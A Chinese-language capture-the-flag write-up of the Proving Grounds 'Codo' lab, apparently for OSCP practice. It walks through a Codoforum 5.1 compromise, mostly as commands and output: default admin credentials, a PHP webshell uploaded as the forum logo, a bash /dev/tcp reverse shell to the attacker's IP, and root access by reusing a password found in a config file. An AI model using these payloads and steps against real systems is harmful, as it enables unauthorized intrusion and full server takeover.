# Proving Grounds Codo WriteUp


Codo  Easy  10p



## 端口扫描

```shell
┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/2-codo]
└─$ sudo nmap -n -r --min-rate=3500 -F -sSV  192.168.196.23                   
[sudo] xavier 的密码：
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-04 21:22 CST
Nmap scan report for 192.168.196.23
Host is up (0.13s latency).
Not shown: 98 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.04 seconds
```



## InitAccess

### Web弱口令

默认密码：admin：admin登录后台

找到历史漏洞

```shell
┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/2-codo]
└─$ python3 50978.py -t http://192.168.196.23 -u admin -p admin -i 192.168.45.246 -n 9001

CODOFORUM V5.1 ARBITRARY FILE UPLOAD TO RCE(Authenticated)

  ______     _______     ____   ___ ____  ____      _____ _  ___ ____  _  _
 / ___\ \   / / ____|   |___ \ / _ \___ \|___ \    |___ // |( _ ) ___|| || |
| |    \ \ / /|  _| _____ __) | | | |__) | __) |____ |_ \| |/ _ \___ \| || |_
| |___  \ V / | |__|_____/ __/| |_| / __/ / __/_____|__) | | (_) |__) |__   _|
 \____|  \_/  |_____|   |_____|\___/_____|_____|   |____/|_|\___/____/   |_|


Exploit found and written by: @vikaran101

[&#43;] Login successful
[*] Checking webshell status and executing...
[-] Something went wrong, please try uploading the shell manually(admin panel &gt; global settings &gt; change forum logo &gt; upload and access from http://192.168.196.23/sites/default/assets/img/attachments/[file.php])
```

脚本没打成功，手动打一下

文件上传成功

```http
POST /admin/index.php?page=config HTTP/1.1
Host: 192.168.196.23
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml&#43;xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------337198322926933256222094173604
Content-Length: 3791
Origin: http://192.168.196.23
Connection: close
Referer: http://192.168.196.23/admin/index.php?page=config
Cookie: user_id=1; PHPSESSID=plvs2ivgu59ff61gm3qrukmgmo; cf=0
Upgrade-Insecure-Requests: 1

-----------------------------337198322926933256222094173604
Content-Disposition: form-data; name=&#34;site_title&#34;

CODOLOGIC
-----------------------------337198322926933256222094173604
Content-Disposition: form-data; name=&#34;site_description&#34;

codoforum - Enhancing your forum experience with next generation technology!
-----------------------------337198322926933256222094173604
Content-Disposition: form-data; name=&#34;admin_email&#34;

admin@codologic.com
-----------------------------337198322926933256222094173604
Content-Disposition: form-data; name=&#34;default_timezone&#34;

Europe/London
-----------------------------337198322926933256222094173604
Content-Disposition: form-data; name=&#34;register_pass_min&#34;

8
-----------------------------337198322926933256222094173604
Content-Disposition: form-data; name=&#34;num_posts_all_topics&#34;

30
-----------------------------337198322926933256222094173604
Content-Disposition: form-data; name=&#34;num_posts_cat_topics&#34;

20
-----------------------------337198322926933256222094173604
Content-Disposition: form-data; name=&#34;num_posts_per_topic&#34;

20
-----------------------------337198322926933256222094173604
Content-Disposition: form-data; name=&#34;forum_attachments_path&#34;

assets/img/attachments
-----------------------------337198322926933256222094173604
Content-Disposition: form-data; name=&#34;forum_attachments_exts&#34;

jpg,jpeg,png,gif,pjpeg,bmp,txt
-----------------------------337198322926933256222094173604
Content-Disposition: form-data; name=&#34;forum_attachments_size&#34;

3
-----------------------------337198322926933256222094173604
Content-Disposition: form-data; name=&#34;forum_attachments_mimetypes&#34;

image/*,text/plain
-----------------------------337198322926933256222094173604
Content-Disposition: form-data; name=&#34;forum_tags_num&#34;

5
-----------------------------337198322926933256222094173604
Content-Disposition: form-data; name=&#34;forum_tags_len&#34;

15
-----------------------------337198322926933256222094173604
Content-Disposition: form-data; name=&#34;reply_min_chars&#34;

10
-----------------------------337198322926933256222094173604
Content-Disposition: form-data; name=&#34;insert_oembed_videos&#34;

yes
-----------------------------337198322926933256222094173604
Content-Disposition: form-data; name=&#34;forum_privacy&#34;

everyone
-----------------------------337198322926933256222094173604
Content-Disposition: form-data; name=&#34;approval_notify_mails&#34;


-----------------------------337198322926933256222094173604
Content-Disposition: form-data; name=&#34;forum_header_menu&#34;

site_title
-----------------------------337198322926933256222094173604
Content-Disposition: form-data; name=&#34;forum_logo&#34;; filename=&#34;shell.php&#34;
Content-Type: text/plain

&lt;?php echo &#39;test123&lt;br&gt;&#39;;system($_REQUEST[&#39;cmd&#39;]);?&gt;

-----------------------------337198322926933256222094173604
Content-Disposition: form-data; name=&#34;login_by&#34;

USERNAME
-----------------------------337198322926933256222094173604
Content-Disposition: form-data; name=&#34;force_https&#34;

no
-----------------------------337198322926933256222094173604
Content-Disposition: form-data; name=&#34;user_redirect_after_login&#34;

topics
-----------------------------337198322926933256222094173604
Content-Disposition: form-data; name=&#34;sidebar_hide_topic_messages&#34;

off
-----------------------------337198322926933256222094173604
Content-Disposition: form-data; name=&#34;sidebar_infinite_scrolling&#34;

on
-----------------------------337198322926933256222094173604
Content-Disposition: form-data; name=&#34;show_sticky_topics_without_permission&#34;

no
-----------------------------337198322926933256222094173604
Content-Disposition: form-data; name=&#34;CSRF_token&#34;

276425ebf77c5ff5c6c5f9d454a6e96e
-----------------------------337198322926933256222094173604--
```

webshell地址为

```shell
┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/2-codo]
└─$ curl &#39;http://192.168.196.23/sites/default/assets/img/attachments/shell.php?cmd=whoami&#39;
test123&lt;br&gt;www-data
┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/2-codo]
└─$ curl &#39;http://192.168.196.23/sites/default/assets/img/attachments/shell.php?cmd=id&#39;    
test123&lt;br&gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

反弹shell

```sh
http://192.168.196.23/sites/default/assets/img/attachments/shell.php?cmd=bash&#43;-c&#43;&#39;/bin/bash&#43;-i&#43;&gt;%26&#43;/dev/tcp/192.168.45.246/9001&#43;0&gt;%261&#39;

┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/2-codo]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.246] from (UNKNOWN) [192.168.196.23] 46828
bash: cannot set terminal process group (1123): Inappropriate ioctl for device
bash: no job control in this shell
www-data@codo:/var/www/html/sites/default/assets/img/attachments$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@codo:/var/www/html/sites/default/assets/img/attachments$ 
```

## PrivE

```
╔══════════╣ Searching passwords in config PHP files
  &#39;password&#39; =&gt; &#39;FatPanda123&#39;,

```



直接提权，尝试密码复用

```shell
www-data@codo:/tmp$ su -
su -
Password: FatPanda123

id
uid=0(root) gid=0(root) groups=0(root)
python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;;
root@codo:~# ls /root/
ls /root/
email2.txt  proof.txt  snap
root@codo:~# cat /root/proof.txt
cat /root/proof.txt
6a78eexxxxxxxxx6bad8f
```



---

> 作者: Xavier  
> URL: https://www.bthoughts.top/posts/proving-grounds-codo/  

